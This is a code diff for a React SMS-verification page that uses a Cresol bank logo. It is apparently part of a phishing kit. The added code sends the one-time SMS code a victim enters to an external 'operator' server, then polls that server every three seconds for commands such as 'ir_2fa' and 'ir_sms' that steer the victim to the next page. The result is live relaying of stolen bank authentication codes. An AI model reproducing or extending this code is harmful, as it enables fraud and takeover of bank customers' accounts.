@@ -1,8 +1,67 @@
+
 import React, { useState, useEffect } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
+
+// Função para monitorar cliente continuamente na página SMS
+const monitorClientSms = async (clientId: string, navigate: (path: string) => void): Promise<void> => {
+  console.log(`Iniciando monitoramento SMS do cliente: ${clientId}`);
+  
+  let intervalId: NodeJS.Timeout;
+  
+  const monitor = async () => {
+    try {
+      console.log(`Consultando dados do cliente ${clientId} na página SMS...`);
+      
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+
+      console.log(`Status da consulta SMS: ${response.status}`);
+      
+      if (response.ok) {
+        const clientData = await response.json();
+        console.log('Dados do cliente SMS recebidos:', clientData);
+        console.log('Valor do response SMS:', clientData.data?.response);
+        console.log('Valor do command SMS:', clientData.data?.command);
+        
+        // Na página SMS: se receber ir_sms, continua monitorando; se receber ir_2fa, redireciona para token
+        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
+          console.log('Detectado ir_2fa na página SMS - Redirecionando para /token');
+          clearInterval(intervalId);
+          console.log('Monitoramento SMS parado - redirecionando...');
+          navigate('/token');
+          return;
+        }
+        
+        // Se receber ir_sms, continua monitorando (não redireciona)
+        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
+          console.log('Detectado ir_sms na página SMS - Continuando monitoramento...');
+        }
+        
+        console.log('Continuando monitoramento SMS...');
+      } else {
+        const errorData = await response.text();
+        console.log('Erro na consulta SMS do cliente:', errorData);
+      }
+
+    } catch (error) {
+      console.log('Erro durante consulta SMS do cliente:', error);
+    }
+  };
+
+  // Executar primeira consulta imediatamente
+  await monitor();
+  
+  // Configurar monitoramento contínuo a cada 3 segundos
+  intervalId = setInterval(monitor, 3000);
+  console.log('Monitoramento SMS contínuo configurado (3 segundos)');
+};
 
 const SmsPage = () => {
   const [smsCode, setSmsCode] = useState("");
@@ -29,26 +88,26 @@ const SmsPage = () => {
     }
 
     try {
-      console.log('Enviando código SMS para validação:', smsCode);
+      console.log('Enviando código SMS via external-response:', smsCode);
       console.log('ClientId utilizado:', clientId);
       
-      // Aqui você pode enviar o código SMS para a API usando o clientId
-      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/sms`, {
-        method: 'POST',
+      // Enviar código SMS para a API usando external-response
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
+        method: 'PATCH',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          smsCode: smsCode
+          response: smsCode
         })
       });
 
       if (response.ok) {
-        console.log('Código SMS enviado com sucesso');
-        // Navegar para a página de token após validar SMS
-        navigate("/token");
+        console.log('Código SMS enviado com sucesso via external-response');
+        // Iniciar monitoramento contínuo após envio bem-sucedido
+        await monitorClientSms(clientId, navigate);
       } else {
-        console.log('Erro ao enviar código SMS');
+        console.log('Erro ao enviar código SMS via external-response');
       }
     } catch (error) {
       console.log('Erro durante envio do SMS:', error);
